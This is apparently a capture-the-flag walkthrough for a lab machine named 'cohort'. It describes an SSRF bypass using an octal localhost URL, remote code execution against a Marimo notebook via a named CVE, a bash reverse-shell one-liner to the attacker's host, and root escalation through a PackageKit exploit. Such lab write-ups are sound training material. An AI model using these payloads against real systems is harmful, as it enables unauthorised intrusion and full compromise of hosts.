After enumerating with dirsearch, we find lots a 403 and lots of 405.

To access the 403 page, the cleint insights allows us to pass in a url to validate it.

This function is vulnerable to ssrf, and it helps us bypass the earlier 403 found by providing our desired urls
```
http://0177.0.0.1 <--- Localhost, octal form
https://cohort/status <--- 403 page, loads pretty fine now
```

Content of status
```
{
    "service":"cohort-edge","status":"ok","generated_by":"nginx",
    "upstreams":[
        {"name":"marketing","host":"cohort.htb","root":"/var/www/cohort"},
        {"name":"insights-api","host":"cohort.htb","path":"/api/","target":"127.0.0.1:5000"},
        {"name":"notebooks","host":"nb-1be3782a8afd3ad5.cohort.htb","target":"127.0.0.1:8888","note":"internal analyst workspace, not for external use"}
                ]
}
```
Add the new vhost to our /etc/hosts file.

This discovered notebook vhost runs Marimo 0.20.4, which is vulnerable to  CVE-2026-39987

Now, we start a listoner on our Attack box and use the marimoRce.py script to obtain a shell
```bash
python3 ./morimoRce.py <Lhost> <Lport>
```
The shell obtained won't be able to exploit Pack2TheRoot (WebSocket connection was too slow) , so within the shell issue another shell to our listening machine
```bash
bash -c 'bash -i >& /dev/tcp/Lhost/2ndLport 0>&1'
```
Now, upload the Pack2TheRoot script to the target box and run it to gain root level privileges

Read overview on
```
https://www.sentinelone.com/vulnerability-database/cve-2026-41651/
```
Target box had PackageKit 1.2.8 running

Root flag at
```bash
/root/root.txt
```
User flag at
```bash
/home/marimo/user.txt
```


